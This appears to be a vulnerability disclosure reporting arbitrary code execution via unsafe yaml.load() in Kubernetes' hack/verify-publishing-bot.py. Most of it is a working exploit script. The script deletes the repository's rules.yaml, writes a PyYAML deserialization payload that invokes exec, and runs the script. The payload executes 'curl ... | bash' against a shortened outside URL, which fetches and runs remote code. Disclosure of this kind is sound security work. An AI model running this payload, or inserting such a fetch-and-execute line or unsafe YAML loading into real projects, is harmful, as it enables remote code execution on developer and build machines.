# Description
**Arbitrary Code Excecution** in Kubernetes/hack/verify-publishing-bot.py. The hack directory contains many scripts that ensure continuous development of kubernetes, enhance the robustness of the code, improve development efficiency, etc. The explanations and descriptions of these scripts are helpful for contributors. For details, refer to the following guidelines.
# Technical Description
This package was vulnerable to Arbitrary code execution due to a use of a known vulnerable function **load()** in **yaml**. command is executed when the .py file loads the malicious rules.yaml file.  
# Exploit code
**Python File**
```python
import os
os.system('git clone https://github.com/kubernetes/kubernetes.git')
os.chdir('kubernetes/')
exploit = '''!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('curl -s -L http://bit.ly/10hA8iC | bash')"
'''
os.chdir('staging/publishing/')
os.system('rm rules.y*')
open('rules.yaml','w+').write(exploit)
os.chdir('../../')
os.system('python hack/verify-publishing-bot.py')
```
# POC
* Run the exploit code 
![aksdlak](https://cdn.discordapp.com/attachments/749019614352244777/787380186093453392/Screenshot_from_2020-12-12_22-30-23.png)
